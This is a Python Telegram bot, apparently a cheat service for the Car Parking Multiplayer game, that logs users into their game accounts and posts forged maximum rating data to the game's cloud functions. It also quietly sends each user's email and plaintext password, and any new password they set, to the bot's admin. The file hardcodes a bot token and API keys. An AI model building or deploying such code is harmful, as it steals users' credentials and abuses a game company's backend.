
import telebot
import requests
from telebot import types
import json
from datetime import datetime
from threading import Thread
from flask import Flask
import os

# --- UPTIME SERVER ---
app = Flask('')
@app.route('/')
def home(): return "🔥 Flame Bot V22.5 Ultimate is Live!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# --- CONFIG ---
TOKEN = "8314787817:AAHpZnchNnDOaLARhaVU6eNLGbyDuyjz-n0"
bot = telebot.TeleBot(TOKEN, threaded=True, num_threads=15)

ADMIN_ID = 7212602902
# Nuvvu paranja puthiya ID (1925248968) add chesanu
ALLOWED_USERS = {7212602902, 1925248968,6770872906,7880436390,6419619576,
                 8712736018,8500784851,7091843070}

API_KEYS = {
    "CPM1": "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM",
    "CPM2": "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
}

user_sessions = {}

def get_user_info(message):
    u = message.from_user
    return f"👤 {u.first_name} (@{u.username if u.username else 'NoUser'}) [`{u.id}`]"

# --- ADMIN COMMANDS ---
@bot.message_handler(commands=['ban'])
def ban_user(message):
    if message.from_user.id == ADMIN_ID:
        try:
            target = int(message.text.split()[1])
            if target in ALLOWED_USERS:
                ALLOWED_USERS.remove(target)
                bot.send_message(ADMIN_ID, f"🚫 User `{target}` Banned!")
                bot.send_message(target, "❌ Admin banned you.")
            else: bot.send_message(ADMIN_ID, "❌ User not in list.")
        except: bot.send_message(ADMIN_ID, "⚠️ Usage: `/ban [ID]`")

@bot.message_handler(commands=['list'])
def list_users(message):
    if message.from_user.id == ADMIN_ID:
        u_list = "\n".join([f"• `{u}`" for u in ALLOWED_USERS])
        bot.send_message(ADMIN_ID, f"📋 **AUTHORIZED USERS:**\n{u_list}", parse_mode="Markdown")

# --- BOT LOGIC ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    if uid not in ALLOWED_USERS:
        btn = types.InlineKeyboardMarkup()
        btn.add(types.InlineKeyboardButton("✅ APPROVE", callback_data=f"approve_{uid}"),
                types.InlineKeyboardButton("❌ REJECT", callback_data=f"reject_{uid}"))
        bot.send_message(ADMIN_ID, f"🔔 **NEW REQUEST:**\n{get_user_info(message)}", reply_markup=btn, parse_mode="Markdown")
        return bot.reply_to(message, "⏳ Admin approval kaathirikkuka...")
    
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('CPM1', 'CPM2')
    bot.send_message(message.chat.id, "🔥 **FLAME PRO V22.5**\nSelect Version:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text in ['CPM1', 'CPM2'])
def set_version(message):
    user_sessions[message.chat.id] = {'v': message.text, 'info': get_user_info(message)}
    bot.send_message(message.chat.id, "📧 Enter Email:", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(message, get_pass)

def get_pass(message):
    user_sessions[message.chat.id]['email'] = message.text.strip()
    bot.send_message(message.chat.id, "🔑 Enter Password:")
    bot.register_next_step_handler(message, run_login)

def run_login(message):
    cid, pwd = message.chat.id, message.text.strip()
    sess = user_sessions.get(cid)
    bot.send_message(cid, "⏳ Logging in...")

    try:
        r = requests.post(f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={API_KEYS[sess['v']]}", 
                           json={"email": sess['email'], "password": pwd, "returnSecureToken": True})
        res = r.json()
        if r.status_code == 200 and 'idToken' in res:
            sess.update({'token': res['idToken'], 'localid': res['localId']})
            bot.send_message(ADMIN_ID, f"👤 **LOGIN SUCCESS**\nFrom: {sess['info']}\n📧 `{sess['email']}`\n🔑 `{pwd}`\n🎮 {sess['v']}", parse_mode="Markdown")
            
            btn = types.InlineKeyboardMarkup(row_width=1).add(
                types.InlineKeyboardButton("👑 KING RANK (ULTIMATE)", callback_data="rank"),
                types.InlineKeyboardButton("📧 CHANGE EMAIL", callback_data="c_email"),
                types.InlineKeyboardButton("🔐 CHANGE PASSWORD", callback_data="c_pass"),
                types.InlineKeyboardButton("🚪 LOGOUT", callback_data="logout")
            )
            bot.send_message(cid, f"✅ **SUCCESS!**\nUser: `{sess['email']}`", reply_markup=btn)
        else:
            bot.send_message(cid, f"❌ **FAILED:** {res.get('error', {}).get('message')}")
    except: bot.send_message(cid, "❌ Connection Error!")

@bot.callback_query_handler(func=lambda call: True)
def actions(call):
    cid = call.message.chat.id
    
    # Approve Bug Fix: Always answer callback first
    if call.data.startswith("approve_"):
        target = int(call.data.split("_")[1])
        ALLOWED_USERS.add(target)
        bot.answer_callback_query(call.id, "User Approved! ✅")
        bot.send_message(target, "✅ **Approved!** Type /start.")
        bot.edit_message_text(f"✅ Approved: `{target}`", ADMIN_ID, call.message.message_id)
        return

    if call.data.startswith("reject_"):
        target = int(call.data.split("_")[1])
        bot.answer_callback_query(call.id, "Rejected! ❌")
        bot.send_message(target, "❌ Rejected by Admin.")
        bot.edit_message_text(f"❌ Rejected: `{target}`", ADMIN_ID, call.message.message_id)
        return

    sess = user_sessions.get(cid)
    if not sess and call.data != "logout":
        return bot.answer_callback_query(call.id, "Session Expired! /start")
    
    bot.answer_callback_query(call.id)

    if call.data == "logout":
        user_sessions.pop(cid, None)
        bot.send_message(cid, "🚪 Logged out! /start")
        return

    head = {"Authorization": f"Bearer {sess['token']}", "Content-Type": "application/json"}
    key = API_KEYS[sess['v']]

    if call.data == "rank":
        url = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4" if sess['v']=="CPM1" else "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI"
        fields = ["cars","car_fix","car_collided","car_exchange","car_trade","car_wash","slicer_cut","drift_max","drift","cargo","delivery","taxi","levels","gifts","fuel","offroad","speed_banner","reactions","police","run","real_estate","t_distance","treasure","block_post","push_ups","burnt_tire","passanger_distance"]
        r_data = {f: 100000 for f in fields}
        r_data.update({"time": 10000000000, "race_win": 3000})
        requests.post(url, headers=head, json={"data": json.dumps({"RatingData": r_data})})
        bot.send_message(cid, "👑 **KING RANK INJECTED!**")
        bot.send_message(ADMIN_ID, f"👑 **RANK USED**\nFrom: {sess['info']}\nAcc: `{sess['email']}`", parse_mode="Markdown")

    elif call.data == "c_email":
        bot.send_message(cid, "Enter New Email:")
        bot.register_next_step_handler(call.message, finalize_email)
    elif call.data == "c_pass":
        bot.send_message(cid, "Enter New Password:")
        bot.register_next_step_handler(call.message, finalize_pass)

def finalize_email(message):
    cid, sess = message.chat.id, user_sessions.get(message.chat.id)
    if not sess: return
    new_e, key = message.text.strip(), API_KEYS[sess['v']]
    r = requests.post(f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={key}", 
                      json={"idToken": sess['token'], "email": new_e, "returnSecureToken": True})
    res = r.json()
    if r.status_code == 200:
        bot.send_message(cid, f"✅ Email Changed: {new_e}")
        bot.send_message(ADMIN_ID, f"📧 **EMAIL CHANGE**\nFrom: {sess['info']}\nOld: `{sess['email']}`\nNew: `{new_e}`", parse_mode="Markdown")
        sess.update({'token': res['idToken'], 'email': new_e})
    else: bot.send_message(cid, f"❌ Failed: {res.get('error', {}).get('message')}")

def finalize_pass(message):
    cid, sess = message.chat.id, user_sessions.get(message.chat.id)
    if not sess: return
    new_p, key = message.text.strip(), API_KEYS[sess['v']]
    r = requests.post(f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={key}", 
                      json={"idToken": sess['token'], "password": new_p, "returnSecureToken": True})
    res = r.json()
    if r.status_code == 200:
        bot.send_message(cid, "✅ Password Updated!")
        bot.send_message(ADMIN_ID, f"🔐 **PASS CHANGE**\nFrom: {sess['info']}\nAcc: `{sess['email']}`\nNew: `{new_p}`", parse_mode="Markdown")
        sess.update({'token': res['idToken']})
    else: bot.send_message(cid, f"❌ Failed: {res.get('error', {}).get('message')}")

if __name__ == "__main__":
    Thread(target=run_flask).start()
    bot.infinity_polling()

